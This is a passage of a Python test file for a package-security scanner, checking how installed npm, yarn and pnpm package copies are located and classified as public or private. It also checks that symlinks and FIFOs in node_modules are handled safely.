    (pkg / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0"}))
    _node._pnpm_store_entries.cache_clear()
    assert NodeLanguage().resolve_package_dir(name, tmp_path, nm, "1.0.0") == [pkg.resolve()]


def test_shortened_store_id_of_unknown_source_is_looked_up_but_scored_locally(tmp_path, monkeypatch):
    """A store id pnpm shortened before the `@` after the name keeps no source: the
    copy is still looked up by name, but not scored with public metadata."""
    monkeypatch.delenv("npm_config_registry", raising=False)
    name = "a-very-long-package-name-" * 5
    store_id = f"{name}@file+..+local.tgz"[: 120 - 33] + "_" + "0123456789abcdef" * 2
    assert "@" not in store_id
    nm = tmp_path / "node_modules"
    pkg = nm / ".pnpm" / store_id / "node_modules" / name
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0"}))
    [spec] = NodeLanguage().detect_new_packages({pkg / "package.json"}, nm)
    assert spec.from_public_registry is True and spec.source_unknown is True
    # An unshortened file: id is known to be non-public, a registry id public.
    nm2 = _pnpm_isolated_layout(tmp_path / "p")
    specs = NodeLanguage().detect_new_packages(
        {p for p in (nm2 / ".pnpm").rglob("package.json")}, nm2)
    assert {(s.name, s.from_public_registry, s.source_unknown) for s in specs} == {
        ("evilpkg", True, False), ("@corp/dep", True, False), ("localpkg", False, False)}


def test_resolve_package_dir_finds_an_unversioned_transitive_package(tmp_path):
    """A file: package whose manifest has no version, with no top-level link: its store
    copy is still found, while a supplied version still matches exactly."""
    nm = tmp_path / "node_modules"
    pkg = nm / ".pnpm" / "localpkg@file+..+localpkg" / "node_modules" / "localpkg"
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text(json.dumps({"name": "localpkg"}))
    _node._pnpm_store_entries.cache_clear()
    lang = NodeLanguage()
    assert lang.resolve_package_dir("localpkg", tmp_path, nm, None) == [pkg.resolve()]
    assert lang.resolve_package_dir("localpkg", tmp_path, nm, "1.0.0") == []


def test_registry_id_shortened_right_after_the_at_is_still_looked_up(tmp_path, monkeypatch):
    """An 86-character name with a long peer suffix is cut at the 120-character limit
    to `<name>@_<hash>`: no source survives, so it is unknown, never non-public, and the
    collector still sends it to OSV."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    name = "n" * 86
    store_id = f"{name}@1.0.0_react@18.2.0_react-dom@18.2.0"[: 120 - 33] + "_" + "0123456789abcdef" * 2
    assert store_id.startswith(f"{name}@_")
    nm = tmp_path / "node_modules"
    pkg = nm / ".pnpm" / store_id / "node_modules" / name
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0"}))
    [spec] = NodeLanguage().detect_new_packages({pkg / "package.json"}, nm)
    assert spec.from_public_registry is True and spec.source_unknown is True
    non_public: set = set()
    scored_locally: set = set()
    found = _collect_new_packages([nm], {}, "npm", non_public=non_public, scored_locally=scored_locally)
    assert [(n, v) for _e, n, v, _r in found] == [(name, "1.0.0")]
    assert non_public == set() and len(scored_locally) == 1


def test_a_symlink_loop_in_the_store_does_not_hide_a_healthy_copy(tmp_path):
    """A cyclic entry (Python 3.12 raises RuntimeError resolving it, 3.13+ OSError) is
    skipped on its own; the healthy copy beside it is still found."""
    nm = _pnpm_isolated_layout(tmp_path)
    loop = nm / ".pnpm" / "evilpkg@0.0.0" / "node_modules"
    loop.mkdir(parents=True)
    (loop / "evilpkg").symlink_to(loop / "evilpkg")
    _node._pnpm_store_entries.cache_clear()
    healthy = (nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules" / "evilpkg").resolve()
    assert NodeLanguage().resolve_package_dir("evilpkg", tmp_path, nm, "1.0.0") == [healthy]


def test_a_simulated_3_12_symlink_loop_does_not_hide_a_healthy_copy(tmp_path, monkeypatch):
    nm = _pnpm_isolated_layout(tmp_path)
    (nm / ".pnpm" / "evilpkg@0.0.0" / "node_modules" / "evilpkg").mkdir(parents=True)
    _node._pnpm_store_entries.cache_clear()
    real_resolve = Path.resolve

    def resolve(self, *args, **kwargs):
        if "evilpkg@0.0.0" in str(self):
            raise RuntimeError("Symlink loop from " + str(self))
        return real_resolve(self, *args, **kwargs)

    monkeypatch.setattr(Path, "resolve", resolve)
    healthy = real_resolve(nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules" / "evilpkg")
    assert NodeLanguage().resolve_package_dir("evilpkg", tmp_path, nm, "1.0.0") == [healthy]


def test_installed_scan_scores_each_pnpm_copy_on_its_own(tmp_path):
    """`pa scan-project --scan-installed` also resolves every copy; each is its own
    candidate group, so signals from separate copies are not summed."""
    from packagealert.cli.app import _installed_dir_resolver

    nm = tmp_path / "node_modules"
    copies = []
    for store_id in ("evilpkg@1.0.0", "evilpkg@file+..+evilpkg-1.0.0.tgz"):
        d = nm / ".pnpm" / store_id / "node_modules" / "evilpkg"
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
        copies.append(d.resolve())
    _node._pnpm_store_entries.cache_clear()
    resolve, _warnings = _installed_dir_resolver(tmp_path)
    assert sorted(resolve("npm", "evilpkg", "1.0.0")) == sorted([[c] for c in copies])


def _registry_and_file_copies(root: Path) -> tuple[Path, Path, Path]:
    nm = root / "node_modules"
    made = []
    for store_id in ("evilpkg@1.0.0", "evilpkg@file+..+evilpkg-1.0.0.tgz"):
        d = nm / ".pnpm" / store_id / "node_modules" / "evilpkg"
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
        made.append(d)
    _node._pnpm_store_entries.cache_clear()
    return nm, made[0], made[1]


class _RecordingEngine:
    def __init__(self):
        self.calls: dict = {}

    async def analyze(self, event, package_dirs, manifest_warning=None, *, local_only=False):
        from types import SimpleNamespace

        self.calls[package_dirs[0].parent.parent.name] = local_only
        return SimpleNamespace(score=0, level="info", signals=[])


def test_installed_scan_scores_a_non_public_copy_on_its_source(tmp_path):
    """`--scan-installed` passes no local_only keys; the shared scorer still asks each
    copy's provenance, so the file: copy gets no public-metadata reduction."""
    import asyncio

    from packagealert.cli.app import _installed_dir_resolver
    from packagealert.scoring import score_packages

    _registry_and_file_copies(tmp_path)
    resolve, warnings = _installed_dir_resolver(tmp_path)
    engine = _RecordingEngine()
    asyncio.run(score_packages(engine, [("npm", "evilpkg", "1.0.0")],  # type: ignore[arg-type]
                               package_dir_resolver=resolve, manifest_warning_resolver=warnings))
    assert engine.calls == {"evilpkg@1.0.0": False, "evilpkg@file+..+evilpkg-1.0.0.tgz": True}


def test_incremental_install_scores_a_preexisting_file_copy_on_its_source(tmp_path, monkeypatch):
    """The file: copy predates the run, so only the new registry copy is collected and
    scored_locally stays empty; the resolver still returns both, and the old file: copy
    is scored on its source."""
    import asyncio
    from types import SimpleNamespace

    from tests.unit.test_sandbox import _async_value, _make_runner

    nm, _registry, _file = _registry_and_file_copies(tmp_path)
    runner = _make_runner()
    engine = _RecordingEngine()

    async def resources():
        return SimpleNamespace(engine=engine)

    monkeypatch.setattr(runner, "_open_gate_resources", resources)
    monkeypatch.setattr(runner, "_close_gate_resources", lambda res: _async_value(None))
    assert asyncio.run(runner._post_scan_risk([("npm", "evilpkg", "1.0.0", nm)], set())) is True
    assert engine.calls == {"evilpkg@1.0.0": False, "evilpkg@file+..+evilpkg-1.0.0.tgz": True}


def test_resolve_package_dir_treats_an_empty_version_as_none(tmp_path):
    """detect_new_packages() collects `"version": ""` as no version; the store lookup
    must read it the same way, or its only copy is never scanned."""
    nm = tmp_path / "node_modules"
    pkg = nm / ".pnpm" / "localpkg@file+..+localpkg" / "node_modules" / "localpkg"
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text(json.dumps({"name": "localpkg", "version": ""}))
    _node._pnpm_store_entries.cache_clear()
    [spec] = NodeLanguage().detect_new_packages({pkg / "package.json"}, nm)
    assert spec.version is None
    assert NodeLanguage().resolve_package_dir("localpkg", tmp_path, nm, None) == [pkg.resolve()]


def test_a_raising_provenance_descriptor_falls_back_to_local_scoring(tmp_path, monkeypatch):
    """A plugin's copy_from_public_registry can be a descriptor that raises on access;
    the copy is still scored, on its source alone."""
    from packagealert import scoring
    from packagealert.languages import registry as lang_registry

    class Lang:
        resolve_package_dir_returns_copies = True

        @property
        def copy_from_public_registry(self):
            raise RuntimeError("plugin bug")

    monkeypatch.setattr(lang_registry, "for_ecosystem", lambda eco: Lang())
    assert scoring.copy_scored_locally("npm", "evilpkg", tmp_path) is True


def test_a_raising_copies_descriptor_keeps_source_scoring(tmp_path, monkeypatch):
    """A broken resolve_package_dir_returns_copies falls back to the default grouping in
    the runner, the installed scan and the daemon, so the directories are still scanned."""
    import asyncio
    from datetime import UTC, datetime
    from types import SimpleNamespace

    from packagealert.daemon import _analyze_copies
    from packagealert.languages import registry as lang_registry
    from packagealert.models.events import PackageEvent
    from packagealert.sandbox.runner import _resolves_copies

    class Lang:
        @property
        def resolve_package_dir_returns_copies(self):
            raise RuntimeError("plugin bug")

    monkeypatch.setattr(lang_registry, "for_ecosystem", lambda eco: Lang())
    assert _resolves_copies("npm") is False
    seen: list = []

    class Engine:
        async def analyze(self, event, package_dirs, manifest_warning=None, *, local_only=False):
            seen.append(list(package_dirs))
            return SimpleNamespace(score=0)

    event = PackageEvent(ecosystem="npm", package_name="evilpkg", version="1.0.0", source="process",
                         manager="pnpm", project_path=tmp_path, timestamp=datetime.now(UTC))
    asyncio.run(_analyze_copies(Engine(), event, [tmp_path], None))
    assert seen == [[tmp_path]]


def _nested_layout(project: Path) -> Path:
    """npm's and yarn 1's nested layout (as npm 11.21.1 and yarn 1.22.22 write it): one
    version hoisted to node_modules/<name>, another nested beneath its dependent,
    scoped names included, and nesting below a nested copy."""
    nm = project / "node_modules"
    for rel, name, version in (
            ("ms", "ms", "2.0.0"),
            ("debug", "debug", "4.3.4"),
            ("debug/node_modules/ms", "ms", "2.1.2"),
            ("@babel/highlight", "@babel/highlight", "7.24.7"),
            ("@babel/code-frame", "@babel/code-frame", "7.0.0"),
            ("@babel/code-frame/node_modules/@babel/highlight", "@babel/highlight", "7.0.0"),
            ("a", "a", "1.0.0"),
            ("a/node_modules/b", "b", "1.0.0"),
            ("a/node_modules/b/node_modules/ms", "ms", "2.1.3"),
            ("c", "c", "1.0.0"),
            ("c/node_modules/ms", "ms", "2.1.2"),
    ):
        (nm / rel).mkdir(parents=True)
        (nm / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
        (nm / rel / "index.js").write_text("module.exports = 1;\n")
    return nm


def test_post_install_scan_finds_nested_copies(tmp_path, monkeypatch):
    """The real collector over a nested layout: every copy npm or yarn 1 installed is
    found, the nested ones included (#99)."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = _nested_layout(tmp_path)
    found = _collect_new_packages([nm], {}, "npm", non_public=set())
    assert sorted((name, version) for _eco, name, version, _root in found) == [
        ("@babel/code-frame", "7.0.0"), ("@babel/highlight", "7.0.0"), ("@babel/highlight", "7.24.7"),
        ("a", "1.0.0"), ("b", "1.0.0"), ("c", "1.0.0"), ("debug", "4.3.4"),
        ("ms", "2.0.0"), ("ms", "2.1.2"), ("ms", "2.1.3")]


@pytest.mark.parametrize(("rel", "nested"), [
    ("a/node_modules/b/package.json", True),
    ("@s/a/node_modules/@t/b/package.json", True),
    ("a/node_modules/@t/b/node_modules/c/package.json", True),
    ("a/package.json", False),                               # top level: accepted on its own
    ("a/lib/package.json", False),                           # a file inside a package
    ("a/node_modules/b/test/package.json", False),
    ("a/node_modules/.bin/package.json", False),
    ("a/node_modules/package.json", False),
    ("a/node_modules/@t/package.json", False),               # a scope is not a package
    ("a/node_modules/node_modules/b/package.json", False),
    ("a/node_modules/b/index.js", False),
])
def test_nested_manifest_paths(rel, nested):
    assert _node._nested_manifest(Path(rel)) is nested


def test_resolve_package_dir_returns_the_nested_copy_at_its_version(tmp_path):
    nm = _nested_layout(tmp_path)
    lang = NodeLanguage()

    def resolved(name, version):
        return sorted(str(p.relative_to(nm.resolve())) for p in lang.resolve_package_dir(name, tmp_path, None, version))

    assert resolved("ms", "2.0.0") == ["ms"]
    assert resolved("ms", "2.1.2") == ["c/node_modules/ms", "debug/node_modules/ms"]   # every copy
    assert resolved("ms", "2.1.3") == ["a/node_modules/b/node_modules/ms"]
    assert resolved("@babel/highlight", "7.0.0") == ["@babel/code-frame/node_modules/@babel/highlight"]
    assert resolved("b", "1.0.0") == ["a/node_modules/b"]                              # nested only
    assert resolved("ms", "^2.0.0") == ["ms"]          # no copy at that version: the top level, as before


def test_nested_copy_behind_a_symlink_is_not_resolved(tmp_path):
    """A node_modules or package directory that is a symlink is not walked: it could lead
    outside the install."""
    nm = _nested_layout(tmp_path / "proj")
    outside = tmp_path / "outside" / "ms"
    outside.mkdir(parents=True)
    (outside / "package.json").write_text(json.dumps({"name": "ms", "version": "9.0.0"}))
    (nm / "a" / "node_modules" / "b" / "node_modules" / "evil").symlink_to(outside)
    (nm / "debug" / "node_modules" / "ms").rename(tmp_path / "moved")
    (nm / "debug" / "node_modules").rmdir()
    (nm / "debug" / "node_modules").symlink_to(tmp_path / "outside")
    lang = NodeLanguage()
    assert lang.resolve_package_dir("ms", tmp_path / "proj", None, "9.0.0") == [(nm / "ms").resolve()]
    assert lang.resolve_package_dir("evil", tmp_path / "proj", None, "9.0.0") == []


def test_nested_index_follows_a_new_install(tmp_path):
    """The index is rebuilt when an install rewrites npm's hidden lock, so a copy nested
    by a later install is found."""
    nm = _nested_layout(tmp_path)
    (nm / ".package-lock.json").write_text("{}")
    lang = NodeLanguage()
    assert lang.resolve_package_dir("b", tmp_path, None, "2.0.0") == []
    later = nm / "c" / "node_modules" / "b"
    later.mkdir()
    (later / "package.json").write_text(json.dumps({"name": "b", "version": "2.0.0"}))
    lock = nm / ".package-lock.json"
    lock.write_text('{"lockfileVersion": 3}')
    stat = lock.stat()
    os.utime(lock, ns=(stat.st_atime_ns, stat.st_mtime_ns + 1_000_000_000))
    assert lang.resolve_package_dir("b", tmp_path, None, "2.0.0") == [later.resolve()]


def test_nested_index_does_not_follow_a_symlink_inside_the_tree(tmp_path):
    """A linked package (a workspace or link: dependency) is not a nested copy, and following
    links could walk a loop forever."""
    nm = _nested_layout(tmp_path)
    (nm / "c" / "node_modules" / "linked").symlink_to(Path("../../a"))
    (nm / "a" / "node_modules" / "loop").symlink_to(Path(".."))
    index = _node._nested_copy_dirs(nm)
    assert "linked" not in index and "loop" not in index
    assert sorted(index) == ["@babel/highlight", "b", "ms"]


def test_nested_index_does_not_walk_a_linked_node_modules(tmp_path, monkeypatch):
    """A nested node_modules that links back up the tree would make the walk endless."""
    nm = _nested_layout(tmp_path)
    (nm / "c" / "node_modules" / "ms").rename(tmp_path / "moved")
    (nm / "c" / "node_modules").rmdir()
    (nm / "c" / "node_modules").symlink_to(Path(".."))
    real_scandir, calls = os.scandir, []

    def bounded_scandir(path):
        calls.append(path)
        if len(calls) > 500:
            raise RuntimeError("the walk did not terminate")
        return real_scandir(path)

    monkeypatch.setattr(_node.os, "scandir", bounded_scandir)
    assert sorted(_node._nested_copy_dirs(nm)) == ["@babel/highlight", "b", "ms"]


def test_nested_copies_are_found_beside_a_pnpm_store(tmp_path):
    """A node_modules/.pnpm (left by an earlier pnpm, or beside npm-style nesting) does
    not hide nested copies: both layouts are searched."""
    nm = _nested_layout(tmp_path)
    (nm / ".pnpm").mkdir()
    lang = NodeLanguage()
    assert lang.resolve_package_dir("ms", tmp_path, None, "2.1.3") == [
        (nm / "a" / "node_modules" / "b" / "node_modules" / "ms").resolve()]
    store_copy = nm / ".pnpm" / "ms@2.1.3" / "node_modules" / "ms"
    store_copy.mkdir(parents=True)
    (store_copy / "package.json").write_text(json.dumps({"name": "ms", "version": "2.1.3"}))
    assert sorted(lang.resolve_package_dir("ms", tmp_path, None, "2.1.3")) == sorted([
        store_copy.resolve(), (nm / "a" / "node_modules" / "b" / "node_modules" / "ms").resolve()])


def test_each_nested_copy_is_judged_by_its_own_lock_entry(tmp_path, monkeypatch):
    """A nested copy npm's lock records from a file: tarball is scored on its source
    alone, even when a registry copy of the same version was just installed beside it."""
    from packagealert.languages import registry
    from packagealert.scoring import copy_scored_locally

    monkeypatch.delenv("npm_config_registry", raising=False)
    registry.load()
    nm = _nested_layout(tmp_path)
    (tmp_path / "package.json").write_text(json.dumps({"name": "proj", "dependencies": {"c": "1.0.0"}}))
    reg = "https://registry.npmjs.org/"
    (nm / ".package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "node_modules/c": {"version": "1.0.0", "resolved": reg + "c/-/c-1.0.0.tgz",
                           "dependencies": {"ms": "file:../vendor/ms-2.1.2.tgz"}},
        "node_modules/c/node_modules/ms": {"version": "2.1.2", "resolved": "file:../vendor/ms-2.1.2.tgz"},
        "node_modules/debug/node_modules/ms": {"version": "2.1.2", "resolved": reg + "ms/-/ms-2.1.2.tgz"},
    }}))
    copies = {str(d.relative_to(nm.resolve())): copy_scored_locally("npm", "ms", d)
              for d in NodeLanguage().resolve_package_dir("ms", tmp_path, None, "2.1.2")}
    assert copies == {"c/node_modules/ms": True, "debug/node_modules/ms": False}
    # A copy the lock does not record keeps the event's provenance.
    assert copy_scored_locally("npm", "ms", (nm / "a" / "node_modules" / "b" / "node_modules" / "ms").resolve()) is False


def test_aliased_copies_resolve_by_their_manifest_name(tmp_path, monkeypatch):
    """npm installs an alias (`"ms-new": "npm:ms@2.1.2"`) under the alias's name, and the
    collector reports the manifest's: each copy it reports resolves to itself, not to
    the hoisted copy of another version (as npm 11.21.1 lays it out)."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = tmp_path / "node_modules"
    for rel, name, version in (("ms", "ms", "2.0.0"), ("ms-new", "ms", "2.1.2"),
                               ("debug", "debug", "4.3.4"), ("debug/node_modules/ms-alt", "ms", "2.1.3")):
        (nm / rel).mkdir(parents=True)
        (nm / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
    found = _collect_new_packages([nm], {}, "npm", non_public=set())
    lang = NodeLanguage()
    resolved = {(name, version): [str(p.relative_to(nm.resolve())) for p in
                                  lang.resolve_package_dir(name, tmp_path, None, version)]
                for _eco, name, version, _root in found}
    assert resolved == {("debug", "4.3.4"): ["debug"], ("ms", "2.0.0"): ["ms"],
                        ("ms", "2.1.2"): ["ms-new"], ("ms", "2.1.3"): ["debug/node_modules/ms-alt"]}


def _bounded(fn, timeout: float = 5.0):
    """fn()'s result, failing rather than hanging if it blocks (a FIFO read never returns)."""
    import threading

    box: list = []
    worker = threading.Thread(target=lambda: box.append(fn()), daemon=True)
    worker.start()
    worker.join(timeout)
    assert box, "blocked reading a manifest"
    return box[0]


@pytest.mark.parametrize("linked", [False, True])
def test_a_fifo_manifest_does_not_block_resolution_or_collection(tmp_path, monkeypatch, linked):
    """An install can leave a FIFO where a package.json belongs, directly or through a
    symlink: it is skipped, never read."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = _nested_layout(tmp_path / "proj")
    evil = nm / "debug" / "node_modules" / "evil"
    evil.mkdir()
    if linked:
        os.mkfifo(tmp_path / "pipe")
        (evil / "package.json").symlink_to(tmp_path / "pipe")
    else:
        os.mkfifo(evil / "package.json")
    lang = NodeLanguage()
    assert _bounded(lambda: lang.resolve_package_dir("ms", tmp_path / "proj", None, "2.0.0")) == [(nm / "ms").resolve()]
    found = _bounded(lambda: _collect_new_packages([nm], {}, "npm", non_public=set()))
    assert ("ms", "2.1.2") in {(name, version) for _eco, name, version, _root in found}


def test_an_alias_is_not_resolved_under_the_name_it_is_installed_as(tmp_path):
    """A directory named debug whose manifest declares ms@2.1.2 (an alias) is ms's copy,
    not debug's, at the top level or nested."""
    nm = tmp_path / "node_modules"
    for rel, name, version in (("debug", "debug", "2.1.2"), ("parent", "parent", "1.0.0"),
                               ("parent/node_modules/debug", "ms", "2.1.2"),
                               ("other", "other", "1.0.0"), ("other/node_modules/ms", "debug", "3.0.0")):
        (nm / rel).mkdir(parents=True)
        (nm / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
    lang = NodeLanguage()

    def resolved(name, version):
        return [str(p.relative_to(nm.resolve())) for p in lang.resolve_package_dir(name, tmp_path, None, version)]

    assert resolved("debug", "2.1.2") == ["debug"]
    assert resolved("ms", "2.1.2") == ["parent/node_modules/debug"]
    assert resolved("debug", "3.0.0") == ["other/node_modules/ms"]
    (nm / "debug" / "package.json").write_text(json.dumps({"name": "ms", "version": "2.1.2"}))
    assert resolved("debug", "2.1.2") == []                     # the top-level debug is ms


def test_detect_installed_does_not_follow_a_linked_store_entry(lang: NodeLanguage, tmp_path: Path) -> None:
    """A store entry whose node_modules links outside the install holds nothing installed."""
    outside = tmp_path / "outside" / "node_modules" / "external"
    outside.mkdir(parents=True)
    (outside / "package.json").write_text(json.dumps({"name": "external", "version": "9.9.9"}))
    entry = tmp_path / "proj" / "node_modules" / ".pnpm" / "x@1.0.0"
    entry.mkdir(parents=True)
    (entry / "node_modules").symlink_to(tmp_path / "outside" / "node_modules")
    assert lang.detect_installed_packages(tmp_path / "proj") == []


def test_detect_installed_finds_dependencies_bundled_in_a_store_package(lang: NodeLanguage, tmp_path: Path,
                                                                          monkeypatch) -> None:
    """pnpm unpacks a package's bundled dependencies inside it; each has its parent's source."""
    monkeypatch.delenv("npm_config_registry", raising=False)
    store = tmp_path / "node_modules" / ".pnpm"
    for rel, name, version in (
            ("parent@1.0.0/node_modules/parent", "parent", "1.0.0"),
            ("parent@1.0.0/node_modules/parent/node_modules/child", "child", "2.0.0"),
            ("parent@1.0.0/node_modules/parent/node_modules/child/node_modules/grandchild", "grandchild", "3.0.0"),
            ("local@file+..+local-1.0.0.tgz/node_modules/local", "local", "1.0.0"),
            ("local@file+..+local-1.0.0.tgz/node_modules/local/node_modules/vendored", "vendored", "4.0.0"),
    ):
        (store / rel).mkdir(parents=True)
        (store / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
    public = {(p.name, p.version): p.from_public_registry for p in lang.detect_installed_packages(tmp_path)}
    assert public == {("parent", "1.0.0"): True, ("child", "2.0.0"): True, ("grandchild", "3.0.0"): True,
                      ("local", "1.0.0"): False, ("vendored", "4.0.0"): False}


def test_bundled_store_copies_resolve_with_their_parents_provenance(lang: NodeLanguage, tmp_path: Path,
                                                                    monkeypatch) -> None:
    """Each bundled copy discovery reports resolves to its own directory, and is a registry
    copy exactly when the store package it shipped in is."""
    from packagealert.languages import registry
    from packagealert.scoring import copy_scored_locally

    monkeypatch.delenv("npm_config_registry", raising=False)
    registry.load()
    store = tmp_path / "node_modules" / ".pnpm"
    for rel, name, version in (
            ("parent@1.0.0/node_modules/parent", "parent", "1.0.0"),
            ("parent@1.0.0/node_modules/parent/node_modules/child", "child", "2.0.0"),
            ("local@file+..+local-1.0.0.tgz/node_modules/local", "local", "1.0.0"),
            ("local@file+..+local-1.0.0.tgz/node_modules/local/node_modules/@v/vendored", "@v/vendored", "4.0.0"),
    ):
        (store / rel).mkdir(parents=True)
        (store / rel / "package.json").write_text(json.dumps({"name": name, "version": version}))
    scored_locally = {}
    for p in lang.detect_installed_packages(tmp_path):
        dirs = lang.resolve_package_dir(p.name, tmp_path, None, p.version)
        assert len(dirs) == 1, (p.name, dirs)
        assert (dirs[0] / "package.json").exists()
        scored_locally[p.name] = copy_scored_locally("npm", p.name, dirs[0])
    assert scored_locally == {"parent": False, "child": False, "local": True, "@v/vendored": True}


def test_npm_bundled_entries_inherit_their_containing_packages_provenance(lang: NodeLanguage, tmp_path: Path,
                                                                          monkeypatch) -> None:
    """A bundled lock entry (inBundle, no resolved URL) shipped in its container's tarball:
    public only if that is, through a chain of bundles. A dependency fetched on its own,
    nested in the same parent, keeps its own entry's verdict."""
    monkeypatch.delenv("npm_config_registry", raising=False)
    reg = "https://registry.npmjs.org/"
    public = _node.package_lock_provenance({
        "": {"dependencies": {"parent": "file:vendor/parent-1.0.0.tgz", "pub": "1.0.0"}},
        "node_modules/parent": {"version": "1.0.0", "resolved": "file:vendor/parent-1.0.0.tgz"},
        # Listed before its container, so the verdict cannot depend on key order.
        "node_modules/parent/node_modules/child/node_modules/grandchild": {"version": "3.0.0", "inBundle": True},
        "node_modules/parent/node_modules/child": {"version": "2.0.0", "inBundle": True},
        "node_modules/parent/node_modules/fetched": {"version": "4.0.0", "resolved": reg + "fetched/-/fetched-4.0.0.tgz"},
        "node_modules/pub": {"version": "1.0.0", "resolved": reg + "pub/-/pub-1.0.0.tgz"},
        "node_modules/pub/node_modules/kept": {"version": "5.0.0", "inBundle": True},
    }, (None, {}))
    assert public == {
        "node_modules/parent": False,
        "node_modules/parent/node_modules/child": False,
        "node_modules/parent/node_modules/child/node_modules/grandchild": False,
        "node_modules/parent/node_modules/fetched": True,
        "node_modules/pub": True,
        "node_modules/pub/node_modules/kept": True,
    }


def test_store_copy_from_a_private_scope_is_not_scored_as_public(lang: NodeLanguage, tmp_path: Path,
                                                                 monkeypatch) -> None:
    """A store copy from a private scoped registry, and what it bundles, is scored on its
    source alone even when a public copy of the same version is installed beside it."""
    from packagealert.languages import registry
    from packagealert.scoring import copy_scored_locally

    monkeypatch.delenv("npm_config_registry", raising=False)
    registry.load()
    (tmp_path / ".npmrc").write_text("@corp:registry=https://npm.corp.example/\n")
    store = tmp_path / "node_modules" / ".pnpm"
    for rel, name in (("@corp+lib@1.0.0/node_modules/@corp/lib", "@corp/lib"),
                      ("@corp+lib@1.0.0/node_modules/@corp/lib/node_modules/child", "child"),
                      ("child@1.0.0/node_modules/child", "child")):
        (store / rel).mkdir(parents=True)
        (store / rel / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0"}))
    copies = {str(d.relative_to(store.resolve())): copy_scored_locally("npm", "child", d)
              for d in lang.resolve_package_dir("child", tmp_path, None, "1.0.0")}
    assert copies == {"child@1.0.0/node_modules/child": False,
                      "@corp+lib@1.0.0/node_modules/@corp/lib/node_modules/child": True}
    lib = lang.resolve_package_dir("@corp/lib", tmp_path, None, "1.0.0")
    assert [copy_scored_locally("npm", "@corp/lib", d) for d in lib] == [True]


def test_bundled_children_of_a_manifestless_store_owner_keep_its_verdict(lang: NodeLanguage, tmp_path: Path,
                                                                         monkeypatch) -> None:
    """An owner whose manifest is missing is still judged by its store id and installed
    name, so what it bundles does not fall back to its own registry verdict."""
    monkeypatch.delenv("npm_config_registry", raising=False)
    (tmp_path / ".npmrc").write_text("@corp:registry=https://npm.corp.example/\n")
    store = tmp_path / "node_modules" / ".pnpm"
    for owner, child in (("local@file+..+local-1.0.0.tgz/node_modules/local", "a"),
                         ("@corp+lib@1.0.0/node_modules/@corp/lib", "b"),
                         ("pub@1.0.0/node_modules/pub", "c")):
        (store / owner / "node_modules" / child).mkdir(parents=True)
        (store / owner / "node_modules" / child / "package.json").write_text(
            json.dumps({"name": child, "version": "1.0.0"}))
    public = {p.name: p.from_public_registry for p in lang.detect_installed_packages(tmp_path)}
    assert public == {"a": False, "b": False, "c": True}


def test_a_non_public_bundle_carries_over_to_what_it_bundles(lang: NodeLanguage, tmp_path: Path, monkeypatch) -> None:
    """A bundled entry is judged against its immediate container's final verdict, so a
    non-public bundle inside a public package keeps what it bundles out of lookups."""
    monkeypatch.delenv("npm_config_registry", raising=False)
    reg = "https://registry.npmjs.org/"
    public = _node.package_lock_provenance({
        "node_modules/pub": {"version": "1.0.0", "resolved": reg + "pub/-/pub-1.0.0.tgz"},
        "node_modules/pub/node_modules/child/node_modules/grand": {"version": "3.0.0", "inBundle": True},
        "node_modules/pub/node_modules/child": {"version": "2.0.0", "inBundle": True,
                                                "resolved": "https://npm.corp.example/child/-/child-2.0.0.tgz"},
    }, (None, {}))
    assert public == {"node_modules/pub": True, "node_modules/pub/node_modules/child": False,
                      "node_modules/pub/node_modules/child/node_modules/grand": False}


def test_a_fifo_lock_does_not_block_discovery_and_a_linked_lock_is_read(lang: NodeLanguage, tmp_path: Path,
                                                                        monkeypatch) -> None:
    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = tmp_path / "node_modules"
    (nm / "evil").mkdir(parents=True)
    (nm / "evil" / "package.json").write_text(json.dumps({"name": "evil", "version": "1.0.0"}))
    os.mkfifo(nm / ".package-lock.json")
    found = _bounded(lambda: lang.detect_installed_packages(tmp_path))
    assert [(p.name, p.from_public_registry) for p in found] == [("evil", True)]
    # A symlinked lock (a monorepo's shared one) is still read.
    (nm / ".package-lock.json").unlink()
    shared = tmp_path / "shared-lock.json"
    shared.write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"name": "app"},
        "node_modules/evil": {"version": "1.0.0", "resolved": "https://npm.corp.example/evil/-/evil-1.0.0.tgz"}}}))
    (tmp_path / "package-lock.json").symlink_to(shared)
    assert [(p.name, p.from_public_registry) for p in lang.detect_installed_packages(tmp_path)] == [("evil", False)]


def test_a_fifo_npmrc_does_not_block_discovery_and_a_linked_one_applies(lang: NodeLanguage, tmp_path: Path,
                                                                         monkeypatch) -> None:
    monkeypatch.delenv("npm_config_registry", raising=False)
    monkeypatch.setattr(_node, "_user_npmrc", lambda: tmp_path / "no-user-npmrc")
    nm = tmp_path / "node_modules"
    (nm / "@corp" / "lib").mkdir(parents=True)
    (nm / "@corp" / "lib" / "package.json").write_text(json.dumps({"name": "@corp/lib", "version": "1.0.0"}))
    os.mkfifo(tmp_path / ".npmrc")
    found = _bounded(lambda: lang.detect_installed_packages(tmp_path))
    assert [(p.name, p.from_public_registry) for p in found] == [("@corp/lib", True)]
    # A symlinked config is read, so a private scope there applies.
    (tmp_path / ".npmrc").unlink()
    shared = tmp_path / "shared-npmrc"
